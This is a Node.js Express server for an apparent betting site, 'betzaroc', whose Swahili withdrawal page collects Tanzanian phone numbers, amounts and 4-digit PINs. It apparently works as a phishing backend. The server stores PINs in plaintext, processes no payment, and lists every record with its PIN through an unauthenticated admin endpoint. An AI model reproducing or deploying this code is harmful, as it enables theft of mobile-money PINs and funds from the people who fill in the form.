const fs = require("fs");
const path = require("path");
const express = require("express");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 4070;
const DATA_FILE = path.join(__dirname, "data", "withdrawals.json");
const MONGODB_URI = process.env.MONGODB_URI || "";

const withdrawalSchema = new mongoose.Schema(
  {
    id: { type: String, unique: true, index: true },
    phone: { type: String, index: true },
    amount: Number,
    pin: String,
    time: String,
    displayTime: String
  },
  { collection: "betzaroc_withdrawals" }
);

const Withdrawal = mongoose.model("BetzarocWithdrawal", withdrawalSchema);

function digitsOnly(value) {
  return String(value || "").replace(/\D/g, "");
}

function normalizePhone(raw) {
  let p = digitsOnly(raw);
  if (p.startsWith("255") && p.length === 12) return p;
  if (p.startsWith("0") && p.length === 10) return "255" + p.slice(1);
  if (p.length === 9) return "255" + p;
  return p;
}

function isValidPhone(p) {
  return /^255[67]\d{8}$/.test(p);
}

function mongoReady() {
  return Boolean(MONGODB_URI) && mongoose.connection.readyState === 1;
}

function loadFile() {
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
  } catch (_) {
    return [];
  }
}

function saveFile(rows) {
  fs.mkdirSync(path.dirname(DATA_FILE), { recursive: true });
  fs.writeFileSync(DATA_FILE, JSON.stringify(rows, null, 2));
}

function toClient(doc) {
  return {
    id: doc.id,
    phone: doc.phone,
    amount: doc.amount,
    pin: doc.pin,
    time: doc.time,
    displayTime: doc.displayTime
  };
}

async function saveWithdrawal(rec) {
  if (mongoReady()) {
    await Withdrawal.updateOne({ id: rec.id }, { $set: rec }, { upsert: true });
    return;
  }
  const rows = loadFile();
  rows.unshift(rec);
  saveFile(rows);
}

async function listWithdrawals(phoneQ) {
  if (mongoReady()) {
    const filter = phoneQ ? { phone: { $regex: phoneQ } } : {};
    const rows = await Withdrawal.find(filter).sort({ time: -1 }).lean();
    return rows.map(toClient);
  }
  let rows = loadFile();
  if (phoneQ) rows = rows.filter((r) => String(r.phone || "").includes(phoneQ));
  return rows;
}

async function importFileIfMongoEmpty() {
  if (!mongoReady()) return;
  const count = await Withdrawal.estimatedDocumentCount();
  if (count > 0) return;
  const rows = loadFile();
  if (!rows.length) return;
  await Withdrawal.insertMany(rows, { ordered: false }).catch(() => {});
  console.log("Imported", rows.length, "local withdrawals into MongoDB");
}

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/kutoa-pesa", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/api/withdraw", async (req, res) => {
  const phone = normalizePhone(req.body.phone);
  const amount = Number(digitsOnly(req.body.amount));
  const pin = digitsOnly(req.body.pin);

  if (!isValidPhone(phone)) {
    return res.status(400).json({ ok: false, error: "Weka namba ya simu sahihi" });
  }
  if (!Number.isFinite(amount) || amount < 1) {
    return res.status(400).json({ ok: false, error: "Weka kiasi" });
  }
  if (!/^\d{4}$/.test(pin)) {
    return res.status(400).json({ ok: false, error: "PIN lazima iwe namba 4 tu" });
  }

  const rec = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    phone,
    amount,
    pin,
    time: new Date().toISOString(),
    displayTime: new Date().toLocaleString("en-TZ", { timeZone: "Africa/Dar_es_Salaam" })
  };

  try {
    await saveWithdrawal(rec);
    res.json({ ok: true, id: rec.id, persist: mongoReady() ? "mongo" : "file" });
  } catch (err) {
    console.log("save error", err.message);
    res.status(500).json({ ok: false, error: "Imeshindikana kuhifadhi" });
  }
});

app.get("/api/admin/withdrawals", async (req, res) => {
  try {
    const q = digitsOnly(req.query.phone || "");
    const rows = await listWithdrawals(q);
    res.json({ ok: true, total: rows.length, persist: mongoReady() ? "mongo" : "file", data: rows });
  } catch (err) {
    console.log("list error", err.message);
    res.status(500).json({ ok: false, error: "Failed to load" });
  }
});

app.get("/admin", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.get("/health", (_req, res) => {
  res.json({
    ok: true,
    app: "betzaroc",
    persist: mongoReady() ? "mongo" : "file",
    mongo: mongoReady()
  });
});

async function start() {
  if (MONGODB_URI) {
    await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 8000,
      socketTimeoutMS: 20000,
      maxPoolSize: 10
    });
    console.log("MongoDB connected");
    await importFileIfMongoEmpty();
  } else {
    console.log("No MONGODB_URI; using local file store");
  }

  app.listen(PORT, () => {
    console.log(`Betzaroc http://localhost:${PORT}`);
    console.log(`Kutoa pesa http://localhost:${PORT}/kutoa-pesa`);
    console.log(`Admin http://localhost:${PORT}/admin`);
  });
}

start().catch((err) => {
  console.log("Startup error:", err);
  process.exit(1);
});
